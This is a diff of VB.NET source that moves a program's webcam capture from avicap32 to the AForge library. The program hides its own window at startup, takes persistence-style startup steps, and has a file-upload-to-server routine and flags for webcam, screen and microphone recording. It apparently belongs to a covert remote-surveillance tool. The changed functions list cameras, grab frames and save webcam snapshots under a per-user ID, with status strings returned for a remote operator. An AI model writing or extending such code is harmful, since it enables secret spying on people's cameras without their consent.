@@ -2,18 +2,27 @@
 Imports System.Drawing.Imaging
 Imports System.Runtime.Serialization.Formatters.Binary
 Imports System.IO
+Imports AForge.Video
+Imports AForge.Video.DirectShow
+'Imports AForge.Video.FFMPEG
 Public Class Main
     Dim isWebCamActive As Boolean = False
     Dim isWebCamRecording As Boolean = False
     Dim isScreenRecording As Boolean = False
     Dim isMicRecording As Boolean = False
-
+    Public Sub New()
+        ' Esta llamada es exigida por el diseñador.
+        InitializeComponent()
+        ' Agregue cualquier inicialización después de la llamada a InitializeComponent().
+        VideoDevice = New FilterInfoCollection(FilterCategory.VideoInputDevice)
+    End Sub
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Hide()
         CheckForIllegalCrossThreadCalls = False
         parameters = Command()
         StartUp.Init()
         ReadParameters(parameters)
+        GetCameras()
         AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
     End Sub
     Sub UploadFileToServer(ByVal filePath As String)
@@ -48,86 +57,62 @@ Public Class Main
     End Sub
 
 #Region "WebCam Service"
-    Dim DATOS As IDataObject
-    Dim IMAGEN As Image
-    Public Const WM_CAP As Short = &H400S
-    Public Const WM_CAP_DLG_VIDEOFORMAT As Integer = WM_CAP + 41
-    Public Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
-    Public Const WM_CAP_DRIVER_DISCONNECT As Integer = WM_CAP + 11
-    Public Const WM_CAP_EDIT_COPY As Integer = WM_CAP + 30
-    Public Const WM_CAP_SEQUENCE As Integer = WM_CAP + 62
-    Public Const WM_CAP_FILE_SAVEAS As Integer = WM_CAP + 23
-    Public Const WM_CAP_SET_PREVIEW As Integer = WM_CAP + 50
-    Public Const WM_CAP_SET_PREVIEWRATE As Integer = WM_CAP + 52
-    Public Const WM_CAP_SET_SCALE As Integer = WM_CAP + 53
-    Public Const WS_CHILD As Integer = &H40000000
-    Public Const WS_VISIBLE As Integer = &H10000000
-    Public Const SWP_NOMOVE As Short = &H2S
-    Public Const SWP_NOSIZE As Short = 1
-    Public Const SWP_NOZORDER As Short = &H4S
-    Public Const HWND_BOTTOM As Short = 1
-    Public Const WM_CAP_STOP As Integer = WM_CAP + 68
-    Public iDevice As Integer = 0 ' Current device ID
-    Public hHwnd As Integer
-    Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
-        (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer,
-        <MarshalAs(UnmanagedType.AsAny)> ByVal lParam As Object) As Integer
-    Public Declare Function SetWindowPos Lib "user32" Alias "SetWindowPos" (ByVal hwnd As Integer,
-        ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer,
-        ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
-    Public Declare Function DestroyWindow Lib "user32" (ByVal hndw As Integer) As Boolean
-    Public Declare Function capCreateCaptureWindowA Lib "avicap32.dll" _
-        (ByVal lpszWindowName As String, ByVal dwStyle As Integer,
-        ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer,
-        ByVal nHeight As Short, ByVal hWndParent As Integer,
-        ByVal nID As Integer) As Integer
-    Public Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short,
-        ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String,
-        ByVal cbVer As Integer) As Boolean
-    Dim threadCam As Threading.Thread
-    Sub StartCamPreview()
+    Dim Camarita As VideoCaptureDevice
+    Dim VideoDevice As FilterInfoCollection
+    Dim BMP As Bitmap
+    Dim picBox As New PictureBox
+    Dim WebCameras As New ArrayList
+    'Dim VideoWriter As New VideoFileWriter()
+    Dim videoFilePath As String
+    Dim usingCamera As Integer
+    Function GetCameras() As String
+        Try
+            WebCameras.Clear()
+            Dim contenido As String = Nothing
+            Dim usingIndex As Integer = 0
+            For Each vid As FilterInfo In VideoDevice
+                Dim content As String = usingIndex & "|" & vid.Name & "|" & vid.MonikerString
+                WebCameras.Add(content)
+                contenido &= content & vbCrLf
+                usingIndex += 1
+            Next
+            Return contenido
+        Catch ex As Exception
+            Return AddToLog("GetCameras@Main", "Error: " & ex.Message, True)
+        End Try
+    End Function
+    Function CameraManager(Optional ByVal camIndex As SByte = 0) As String
         Try
             If Not isWebCamActive Then
-                threadCam = New Threading.Thread(AddressOf OpenPreviewWindow)
-                threadCam.Start()
+                usingCamera = camIndex
+                Camarita = New VideoCaptureDevice(VideoDevice(camIndex).MonikerString)
+                AddHandler Camarita.NewFrame, New NewFrameEventHandler(AddressOf Capturando)
+                Camarita.Start()
+                isWebCamActive = True
+            Else
+                Try
+                    Camarita.Stop()
+                Catch
+                End Try
                 isWebCamActive = True
             End If
+            Return "Camera " & WebCameras(usingCamera) & " (" & usingCamera & ") is now " & isWebCamActive
         Catch ex As Exception
-            AddToLog("StartCamPreview@Main", "Error: " & ex.Message, True)
+            Return AddToLog("CameraManager@Main", "Error: " & ex.Message, True)
         End Try
-    End Sub
-    Sub OpenPreviewWindow()
-        Try
-            hHwnd = capCreateCaptureWindowA(iDevice, WS_VISIBLE Or WS_CHILD, 0, 0, 640, 480, Me.Handle.ToInt32, 0)
-            Dim CAMARA As Integer = Nothing
-            For I = 0 To 10
-                CAMARA = SendMessage(hHwnd, WM_CAP_DRIVER_CONNECT, iDevice, 0)
-                If CAMARA > 0 Then
-                    SendMessage(hHwnd, WM_CAP_SET_SCALE, True, 0)
-                    SendMessage(hHwnd, WM_CAP_SET_PREVIEWRATE, 66, 0)
-                    SendMessage(hHwnd, WM_CAP_SET_PREVIEW, True, 0)
-                    SetWindowPos(hHwnd, HWND_BOTTOM, 0, 0, 800, 600, SWP_NOMOVE Or SWP_NOZORDER)
-                    Exit For
-                End If
-            Next
-        Catch ex As Exception
-            DestroyWindow(hHwnd)
-            AddToLog("OpenPreviewWindow@Main", "Error: " & ex.Message, True)
-            End
-        End Try
+    End Function
+    Private Sub Capturando(sender As Object, eventArgs As NewFrameEventArgs)
+        BMP = DirectCast(eventArgs.Frame.Clone(), Bitmap)
+        'If isWebCamRecording Then
+        '    VideoWriter.WriteVideoFrame(BMP)
+        'End If
     End Sub
     Function TakeCamPicture() As String
         Try
-            StartCamPreview()
-            Threading.Thread.Sleep(10500)
+            Threading.Thread.Sleep(5000)
             Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamPicture.png"
-            If My.Computer.FileSystem.FileExists(filePath) Then
-                My.Computer.FileSystem.DeleteFile(filePath)
-            End If
-            SendMessage(hHwnd, WM_CAP_EDIT_COPY, 0, 0)
-            DATOS = Clipboard.GetDataObject()
-            IMAGEN = CType(DATOS.GetData(GetType(System.Drawing.Bitmap)), Image)
-            IMAGEN.Save(filePath, Imaging.ImageFormat.Png)
+            Dim Imagen = BMP
+            Imagen.Save(filePath, ImageFormat.Png)
             Return filePath
         Catch ex As Exception
             AddToLog("TakeCamPicture@Main", "Error: " & ex.Message, True)
@@ -136,14 +121,14 @@ Public Class Main
     End Function
     Function StartCamRecord() As String
         Try
-            StartCamPreview()
-            Threading.Thread.Sleep(10500)
+            Threading.Thread.Sleep(5000)
             If Not isWebCamRecording Then
-                SendMessage(hHwnd, WM_CAP_DLG_VIDEOFORMAT, 0, 0)
-                SendMessage(hHwnd, WM_CAP_SEQUENCE, 0, 0)
+                'videoFilePath = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamVideo.avi"
+                'VideoWriter.Open(videoFilePath, Camarita.VideoResolution.FrameSize.Width, Camarita.VideoResolution.FrameSize.Height, 25, VideoCodec.Default, 300 * 1000)
+                'VideoWriter.WriteVideoFrame(BMP)
                 isWebCamRecording = True
             End If
-            Return 0
+            Return "Camera " & WebCameras(usingCamera) & " (" & usingCamera & "," & isWebCamActive & ") is now recording in " & videoFilePath
         Catch ex As Exception
             AddToLog("StartCamRecord@Main", "Error: " & ex.Message, True)
             Return "null"
@@ -151,19 +136,12 @@ Public Class Main
     End Function
     Function StopCamRecord() As String
         Try
-            Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamVideo.avi"
             If isWebCamRecording Then
-                SendMessage(hHwnd, WM_CAP_STOP, 0, 0)
-                SendMessage(hHwnd, WM_CAP_FILE_SAVEAS, 0, filePath)
-                Try
-                    If My.Computer.FileSystem.FileExists("C:\CAPTURE.avi") Then
-                        My.Computer.FileSystem.DeleteFile("C:\CAPTURE.avi")
-                    End If
-                Catch
-                End Try
                 isWebCamRecording = False
+                'VideoWriter.Close()
             End If
-            Return filePath
+            BoroHearInterop("Camera video record stopped! Written in " & IO.Path.GetFileName(videoFilePath))
+            Return videoFilePath
         Catch ex As Exception
             AddToLog("StopCamRecord@Main", "Error: " & ex.Message, True)
             Return "null"
